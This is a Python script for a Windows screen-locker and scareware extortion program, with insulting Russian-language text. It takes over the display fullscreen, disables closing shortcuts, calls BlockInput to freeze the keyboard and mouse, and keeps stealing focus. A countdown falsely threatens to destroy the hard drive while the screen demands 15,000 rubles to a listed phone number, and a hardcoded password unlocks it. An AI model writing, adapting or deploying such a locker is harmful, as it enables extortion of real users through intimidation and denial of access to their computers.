import tkinter as tk
from tkinter import messagebox
import time
import random
import sys
import ctypes

def disable_event():
    return "break"

def check_password():
    if password_entry.get() == "123456789":
        root.destroy()
        sys.exit()
    else:
        messagebox.showerror("Ошибка", "Ебать ты даун это неверный пароль!")
        password_entry.delete(0, tk.END)

def update_timer():
    global remaining_time
    if remaining_time > 0:
        mins, secs = divmod(remaining_time, 60)
        timer_label.config(text=f"{mins:02d}:{secs:02d}")
        remaining_time -= 1
        root.after(1000, update_timer)
        
        # Мигание текста
        if remaining_time % 2 == 0:
            warning_label.config(fg='red')
        else:
            warning_label.config(fg='black')
        
        # Рандомное изменение цвета таймера при малом времени
        if remaining_time < 60:
            timer_label.config(fg=random.choice(['red', 'white', 'yellow']))
    else:
        timer_label.config(text="00:00", fg='red')
        warning_label.config(text="Ваш жесткий диск сломан!", fg='red')
        simulate_crash()

def simulate_crash():
    # Создаем эффект "краша системы"
    for _ in range(50):
        x = random.randint(0, root.winfo_screenwidth())
        y = random.randint(0, root.winfo_screenheight())
        error = tk.Label(root, 
                        text="SYSTEM ERROR", 
                        fg='white', 
                        bg='red', 
                        font=('Arial', random.randint(8, 20)))
        error.place(x=x, y=y)
        root.update()

def block_input():
    try:
        ctypes.windll.user32.BlockInput(True)
    except:
        pass

# Создаем главное окно
root = tk.Tk()
root.title(" ")

# Максимальная блокировка интерфейса
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.overrideredirect(True)
root.configure(bg='black')

# Блокировка всех возможных способов закрытия
root.protocol("WM_DELETE_WINDOW", disable_event)
for key in ['<Alt-F4>', '<Control-w>', '<Escape>', '<Alt-Tab>', '<Super>', '<Control-Alt-Delete>']:
    root.bind(key, disable_event)

# Блокировка ввода (Windows)
try:
    block_input()
except:
    pass

# Таймер (30 минут)
remaining_time = 30 * 60

# Элементы интерфейса
timer_label = tk.Label(
    root,
    text="30:00",
    fg='red',
    bg='black',
    font=('Arial', 36, 'bold'),
    justify='center'
)
timer_label.pack(pady=(50, 0))

warning_label = tk.Label(
    root,
    text="По окончанию таймера ваш жесткий диск будет сломан",
    fg='red',
    bg='black',
    font=('Arial', 16, 'bold'),
    justify='center'
)
warning_label.pack(pady=(10, 30))

label = tk.Label(
    root,
    text="Поздравляем, вы далбоёб!\nСкидывайте мне 15 000р на этот номер: +7 914 267 24 91 сбер",
    fg='red',
    bg='black',
    font=('Arial', 24, 'bold'),
    justify='center'
)
label.pack(pady=(0, 30))

password_entry = tk.Entry(
    root,
    show="*",
    font=('Arial', 18),
    width=20
)
password_entry.pack(pady=(0, 20))

button = tk.Button(
    root,
    text="Проверить пароль",
    command=check_password,
    bg='black',
    fg='white',
    font=('Arial', 16),
    relief='flat'
)
button.pack()

# Дополнительные элементы
fake_console = tk.Label(
    root,
    text="> Система заблокирована\n> Требуется оплата для разблокировки",
    fg='#00FF00',
    bg='black',
    font=('Courier New', 12),
    justify='left',
    anchor='w'
)
fake_console.place(x=20, rely=0.9)

# Запускаем таймер
update_timer()

# Принудительное удержание фокуса
def force_focus():
    root.focus_force()
    root.after(100, force_focus)

force_focus()
root.mainloop()